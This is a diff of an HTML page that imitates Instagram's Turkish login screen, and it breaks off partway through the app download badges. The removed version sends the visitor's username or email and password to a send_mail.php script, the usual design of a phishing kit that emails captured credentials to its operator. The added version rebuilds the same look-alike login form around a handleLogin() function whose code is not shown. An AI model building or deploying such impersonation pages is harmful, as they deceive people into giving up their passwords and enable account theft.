@@ -1,54 +1,339 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giriş Yap • Instagram</title>
-    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3048c446e.ico">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; min-height: 100vh; }
-        .wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; flex-grow: 1; margin-top: 32px; }
-        .login-box { background: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 10px 0; text-align: center; }
-        .logo { margin: 36px 0 12px; display: inline-block; background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajl9-PkYhCl.png'); background-position: 0px -52px; background-size: 176px 186px; width: 175px; height: 51px; }
-        .form-container { padding: 0 40px; margin-top: 24px; }
-        .input-group { position: relative; margin-bottom: 6px; }
-        .input-group input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 14px 0 2px 8px; font-size: 12px; outline: none; }
-        .input-group span { position: absolute; left: 8px; top: 10px; color: #8e8e8e; font-size: 12px; transition: all 0.1s ease; pointer-events: none; }
-        .input-group input:focus ~ span, .input-group input:not(:placeholder-shown) ~ span { top: 2px; font-size: 10px; }
-        .btn-login { width: 100%; background-color: #0095f6; border: none; border-radius: 8px; color: #fff; font-size: 14px; font-weight: 600; padding: 7px 0; margin-top: 8px; cursor: pointer; }
-        .btn-login:disabled { opacity: 0.7; cursor: default; }
-        .divider { display: flex; align-items: center; margin: 20px 0; padding: 0 40px; }
-        .line { height: 1px; background: #dbdbdb; flex-grow: 1; }
-        .or { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; }
-        .fb-link { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 15px; }
-        .forgot { color: #00376b; font-size: 12px; text-decoration: none; }
-        .signup { background: #fff; border: 1px solid #dbdbdb; width: 350px; margin-top: 10px; padding: 20px; text-align: center; font-size: 14px; }
-        .signup a { color: #0095f6; font-weight: 600; text-decoration: none; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background: #fafafa;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+  }
+
+  .container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    width: 100%;
+    max-width: 350px;
+  }
+
+  .card {
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    padding: 40px 40px 24px;
+    width: 100%;
+    margin-bottom: 10px;
+    text-align: center;
+  }
+
+  .logo {
+    font-family: 'Billabong', 'Grand Hotel', cursive;
+    font-size: 52px;
+    font-weight: 400;
+    color: #262626;
+    margin-bottom: 24px;
+    letter-spacing: -1px;
+    font-style: normal;
+  }
+
+  /* Fallback logo using SVG-like text style */
+  .logo-img {
+    width: 175px;
+    height: 51px;
+    margin: 0 auto 20px;
+    display: block;
+  }
+
+  .form-group {
+    margin-bottom: 6px;
+    position: relative;
+  }
+
+  .form-input {
+    width: 100%;
+    padding: 9px 10px 7px;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    background: #fafafa;
+    font-size: 12px;
+    color: #262626;
+    outline: none;
+    transition: border-color 0.1s;
+    height: 38px;
+  }
+
+  .form-input:focus {
+    border-color: #a8a8a8;
+    background: #fff;
+  }
+
+  .form-input.has-value {
+    padding-top: 14px;
+    padding-bottom: 2px;
+  }
+
+  .floating-label {
+    position: absolute;
+    left: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 12px;
+    color: #8e8e8e;
+    pointer-events: none;
+    transition: all 0.1s ease;
+  }
+
+  .form-input:focus + .floating-label,
+  .form-input.has-value + .floating-label {
+    top: 8px;
+    transform: translateY(0);
+    font-size: 10px;
+  }
+
+  .show-hide-btn {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    font-size: 14px;
+    font-weight: 600;
+    color: #262626;
+    cursor: pointer;
+    display: none;
+  }
+
+  .form-input:not(:placeholder-shown) ~ .show-hide-btn,
+  .form-input.has-value ~ .show-hide-btn {
+    display: block;
+  }
+
+  .login-btn {
+    width: 100%;
+    padding: 7px 16px;
+    background: #0095f6;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 8px;
+    height: 32px;
+    transition: background 0.1s;
+    opacity: 0.5;
+    pointer-events: none;
+  }
+
+  .login-btn.active {
+    opacity: 1;
+    pointer-events: all;
+  }
+
+  .login-btn.active:hover {
+    background: #1877f2;
+  }
+
+  .or-divider {
+    display: flex;
+    align-items: center;
+    margin: 18px 0;
+    gap: 18px;
+  }
+
+  .or-divider::before,
+  .or-divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: #dbdbdb;
+  }
+
+  .or-divider span {
+    font-size: 13px;
+    font-weight: 600;
+    color: #8e8e8e;
+    letter-spacing: 1px;
+  }
+
+  .facebook-login {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    color: #385185;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    text-decoration: none;
+    margin-bottom: 16px;
+    background: none;
+    border: none;
+    width: 100%;
+  }
+
+  .facebook-login:hover {
+    color: #1a3a6b;
+  }
+
+  .facebook-icon {
+    width: 18px;
+    height: 18px;
+    fill: #385185;
+  }
+
+  .forgot-password {
+    font-size: 12px;
+    color: #00376b;
+    text-decoration: none;
+    display: block;
+    margin-top: 12px;
+    cursor: pointer;
+  }
+
+  .forgot-password:hover {
+    color: #000;
+  }
+
+  .signup-card {
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    padding: 20px 40px;
+    width: 100%;
+    text-align: center;
+    font-size: 14px;
+    color: #262626;
+    margin-bottom: 12px;
+  }
+
+  .signup-card a {
+    color: #0095f6;
+    font-weight: 600;
+    text-decoration: none;
+    cursor: pointer;
+  }
+
+  .signup-card a:hover {
+    text-decoration: underline;
+  }
+
+  .app-download {
+    text-align: center;
+    margin-top: 12px;
+    font-size: 14px;
+    color: #262626;
+    margin-bottom: 16px;
+  }
+
+  .app-badges {
+    display: flex;
+    gap: 8px;
+    justify-content: center;
+    margin-top: 10px;
+  }
+
+  .app-badge {
+    border: 1px solid #262626;
+    border-radius: 5px;
+    padding: 5px 10px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    cursor: pointer;
+    text-decoration: none;
+    color: #262626;
+  }
+
+  .app-badge:hover {
+    background: #f0f0f0;
+  }
+
+  .badge-text { text-align: left; }
+  .badge-sub { font-size: 9px; color: #262626; }
+  .badge-main { font-size: 13px; font-weight: 600; color: #262626; }
+
+  footer {
+    text-align: center;
+    padding: 20px;
+    color: #8e8e8e;
+    font-size: 12px;
+  }
+
+  footer .links {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px 16px;
+    justify-content: center;
+    margin-bottom: 12px;
+  }
+
+  footer .links a {
+    color: #8e8e8e;
+    text-decoration: none;
+    font-size: 12px;
+    cursor: pointer;
+  }
+
+  footer .links a:hover { text-decoration: underline; }
+</style>
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="wrapper">
-        <div class="login-box">
-            <div class="logo"></div>
-            <div class="form-container">
-                <form action="send_mail.php" method="POST">
-                    <div class="input-group">
-                        <input type="text" name="email" placeholder=" " required>
-                        <span>Telefon numarası, kullanıcı adı veya e-posta</span>
-                    </div>
-                    <div class="input-group">
-                        <input type="password" name="pass" placeholder=" " required>
-                        <span>Şifre</span>
-                    </div>
-                    <button type="submit" class="btn-login">Giriş Yap</button>
-                </form>
-                <div class="divider"><div class="line"></div><div class="or">YA DA</div><div class="line"></div></div>
-                <a href="#" class="fb-link">Facebook ile Giriş Yap</a>
-                <a href="#" class="forgot">Şifreni mi unuttun?</a>
-            </div>
-        </div>
-        <div class="signup">Hesabın yok mu? <a href="#">Kaydol</a></div>
-    </div>
-</body>
-</html>
+
+<div class="container">
+  <div class="card">
+    <!-- Instagram Logo -->
+    <div class="logo">Instagram</div>
+
+    <form id="loginForm" onsubmit="return false;">
+      <div class="form-group">
+        <input type="text" class="form-input" id="username" placeholder=" " autocomplete="username" oninput="handleInput(this)">
+        <label class="floating-label" for="username">Telefon numarası, kullanıcı adı veya e-posta</label>
+      </div>
+
+      <div class="form-group">
+        <input type="password" class="form-input" id="password" placeholder=" " autocomplete="current-password" oninput="handleInput(this)">
+        <label class="floating-label" for="password">Şifre</label>
+        <button type="button" class="show-hide-btn" onclick="togglePassword(this)">Göster</button>
+      </div>
+
+      <button type="submit" class="login-btn" id="loginBtn" onclick="handleLogin()">Giriş Yap</button>
+    </form>
+
+    <div class="or-divider"><span>VEYA</span></div>
+
+    <button class="facebook-login">
+      <svg class="facebook-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+      </svg>
+      Facebook ile giriş yap
+    </button>
+
+    <a class="forgot-password" href="#">Şifreni mi unuttun?</a>
+  </div>
+
+  <div class="signup-card">
+    Hesabın yok mu? <a href="#">Kaydol</a>
+  </div>
+
+  <div class="app-download">
+    <div>Uygulamayı indir.</div>
+    <div class="app-badges">
+      <a class="app-badge" href="#">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
+        </svg>
+        <div class="badge-text">
+          <div class="badge-sub">App Store'dan indirin</div>
+          <div class="badge-ma
